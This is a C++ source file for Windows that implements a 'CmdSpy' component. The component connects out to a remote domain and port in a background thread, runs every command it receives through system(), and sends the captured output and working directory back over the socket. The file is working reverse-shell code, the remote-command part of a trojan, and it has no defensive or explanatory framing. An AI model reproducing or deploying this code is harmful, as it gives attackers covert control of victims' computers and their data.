#include "cmdspy.h"


static CRITICAL_SECTION gCs;

static CmdSpy gSpy;

static std::string gTmpReturnFile = "cmd_return.tmp";

CmdSpy::CmdSpy()
{
    CmdPwd = "PWD";

    CmdSplit = ";";
    CmdEnd = "\r\n";


    InitializeCriticalSection(&gCs);
}

CmdSpy::~CmdSpy()
{
    DeleteCriticalSection(&gCs);
}

void CmdSpy::startByNewThread(std::string domain, int port)
{
    char *args = new char[MAX_PATH+sizeof(int)];
    domain.reserve(MAX_PATH);
    memcpy(args,domain.data(), MAX_PATH);
    memcpy(args+MAX_PATH,(char*)&port, sizeof(int));

    HANDLE h = CreateThread(NULL,0, CmdSpy::threadProc,(LPVOID)args,0,NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
    }
}

DWORD CmdSpy::threadProc(LPVOID args)
{
    char domain[MAX_PATH];
    memcpy(domain, args, MAX_PATH);
    int port = *((int*)((char*)args+MAX_PATH));

    startCmdSpy(domain, port);

    delete (char *)args;
    return true;
}

void CmdSpy::startCmdSpy(std::string domain, int port)
{
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect cmd spy server " <<
                     domain << ":" << port << std::endl;
        return;
    }

    std::cout << "Started cmd spy" << std::endl;

    const int packetSize = 800;
    char szData[packetSize];
    int ret;
    std::string buf;

    while (1) {
        ret = sock.recvData(szData, packetSize);

        if (ret == SOCKET_ERROR || ret == 0) {
            break;
        }

       addDataToBuffer(&sock, buf, szData, ret);
    }

    std::cout << "Finished cmd spy" << std::endl;
}

void CmdSpy::addDataToBuffer(TcpSocket *sock, std::string &buf, char *data, int size)
{
    buf.append(data,size);

    int endIndex;
    while ((endIndex = buf.find(gSpy.CmdEnd)) >= 0) {
        std::string cmd = buf.substr(0,endIndex);
        buf.erase(0, endIndex+gSpy.CmdEnd.length());

        std::string retData = execCmd(cmd);
        sock->sendData(retData.data(), retData.size());

        std::string pwd = gSpy.CmdPwd;
        pwd.append(gSpy.CmdSplit);
        pwd.append(getPWD());

        sock->sendData(pwd.data(), pwd.size());
    }
}

std::string CmdSpy::execCmd(std::string cmd)
{
    EnterCriticalSection(&gCs);

    system(cmd.append(" > ").append(gTmpReturnFile).data());

    FILE *fp = fopen(gTmpReturnFile.data(), "rb");
    if (!fp) {
        std::cout << "Failed to open return file of cmd\n";

        LeaveCriticalSection(&gCs);

        return std::string();
    }

    fseek(fp, 0, SEEK_END);
    unsigned int len = ftell(fp);
    rewind(fp);

    char *data = new char[len];
    fread(data, 1, len, fp);
	std::string retData(data, len);
	delete data;

    fclose(fp);

    DeleteFileA(gTmpReturnFile.data());

    LeaveCriticalSection(&gCs);

    return retData;
}

std::string CmdSpy::getPWD()
{
    return execCmd("cd");
}
